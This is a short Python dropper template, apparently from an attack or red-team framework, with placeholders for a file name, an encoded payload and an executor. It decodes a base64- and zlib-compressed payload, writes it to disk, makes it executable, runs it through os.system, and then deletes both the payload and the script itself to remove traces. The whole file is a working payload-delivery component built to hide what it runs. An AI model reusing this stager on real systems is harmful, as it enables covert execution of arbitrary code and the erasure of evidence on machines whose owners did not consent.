#!/usr/bin/python

import base64
import inspect
import os
import zlib

current_file = os.path.abspath(inspect.stack()[0][1])
script_file = os.path.join(os.path.dirname(current_file), "@{file_name}")

with open(script_file, "wb") as f:
    f.write(zlib.decompress(base64.b64decode("@{payload}")))

os.chmod(script_file, 509)
os.system("@!{executor}" + script_file + "@!{additional_args}")
os.remove(script_file)
os.remove(current_file)
